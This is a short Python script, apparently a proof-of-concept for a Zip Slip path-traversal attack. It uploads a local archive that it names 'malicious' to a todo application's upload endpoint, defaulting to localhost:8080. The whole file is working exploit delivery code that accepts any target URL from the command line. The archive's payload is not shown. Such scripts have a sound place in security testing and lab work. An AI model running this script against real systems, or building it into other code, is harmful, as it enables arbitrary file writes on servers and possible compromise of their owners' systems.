import requests
import os
import sys
from urllib.parse import urlparse

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

malicious_zip = os.path.join(os.path.dirname(__file__), 'zip-slip.zip')
input_url = sys.argv[1] if len(sys.argv) > 1 else 'http://localhost:8080'
url = input_url + '/todo/upload.do.action'

# Validate the URL
if not is_valid_url(input_url):
    print("Invalid URL provided")
    sys.exit(1)

files = {'upload': ('zip-slip.zip', open(malicious_zip, 'rb'), 'application/zip')}

requests.post(url, files=files)
